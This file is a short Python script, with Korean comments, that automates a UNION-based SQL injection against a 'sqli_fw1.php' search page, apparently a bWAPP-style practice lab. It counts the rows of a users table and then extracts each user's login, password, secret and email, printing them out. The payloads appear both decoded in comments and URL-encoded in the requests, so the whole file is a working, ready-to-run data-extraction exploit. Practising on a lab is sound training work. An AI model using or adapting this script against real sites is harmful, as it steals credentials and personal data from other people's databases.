import requests
from bs4 import BeautifulSoup

cookies = {"PHPSESSID": "aaaaaaaaaaaaaaaaaaaaaaaaaa", "security_level": "0"}
url = "http://35.77.102.123/sqli_fw1.php?title="

# 데이터 개수 파악을 위한 쿼리
# Payload: ' && 1=2 union select 0,(select COUNT(*) from users),0,0,0,0,0#
count_query = f"{url}%27+%26%26+1%3D2+union+select+0%2C%28select+COUNT%28*%29+from+users%29%2C0%2C0%2C0%2C0%2C0%23&action=search"
response = requests.get(count_query, cookies=cookies)
soup = BeautifulSoup(response.text, 'html.parser')
table = soup.find('table', id='table_yellow')
rows = table.find_all('tr')

for row in rows[1:]:
    columns = row.find_all('td')[0:1]
    values = [column.text for column in columns]
    print("data count:",values[0])
# values[0]에는 select count(*) from users의 결과가 저장


# 데이터 출력
print("column name: login, password, email, secret")
for num in range(0,int(values[0])):
    # Payload: ' && 1=2 union select 0,(select login from users limit 0,1),(select password from users limit 0,1),(select secret from users limit 0,1),(select email from users limit 0,1),5,6#
    payload = f"{url}%27+%26%26+1%3D2+union+select+0%2C%28select+login+from+users+limit+{num}%2C1%29%2C%28select+password+from+users+limit+{num}%2C1%29%2C%28select+secret+from+users+limit+{num}%2C1%29%2C%28select+email+from+users+limit+{num}%2C1%29%2C5%2C6%23&action=search"
    response = requests.get(payload, cookies=cookies)

    soup = BeautifulSoup(response.text, 'html.parser')
    table = soup.find('table', id='table_yellow')
    rows = table.find_all('tr')

    for row in rows[1:]:
        columns = row.find_all('td')[:-1]  # 마지막 td는 LINK 정보가 들어있기 때문에 제외
        values = [column.text for column in columns]
        print(values)






